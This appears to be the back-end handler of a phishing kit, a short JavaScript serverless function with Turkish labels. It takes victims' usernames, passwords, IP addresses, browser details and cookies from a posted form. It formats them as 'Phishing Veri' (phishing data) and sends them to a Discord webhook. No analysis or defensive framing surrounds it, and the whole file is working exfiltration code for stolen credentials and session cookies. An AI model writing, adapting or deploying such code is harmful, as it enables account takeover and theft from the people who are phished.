exports.handler = async (event) => {
    try {
        const { username, password, ip, user_agent, cookies } = JSON.parse(event.body) || {};
        if (!username || !password) throw new Error('Eksik veri');
        const message = `Phishing Veri - ${new Date().toISOString()}:\n**Kullanıcı**: ${username}\n**Şifre**: ${password}\n**IP**: ${ip}\n**Tarayıcı**: ${user_agent}\n**Çerezler**: ${cookies}`;
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
        if (!response.ok) throw new Error(`Discord yanıtı başarısız: ${response.status}`);
        return { statusCode: 200 };
    } catch (error) {
        return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
    }
};
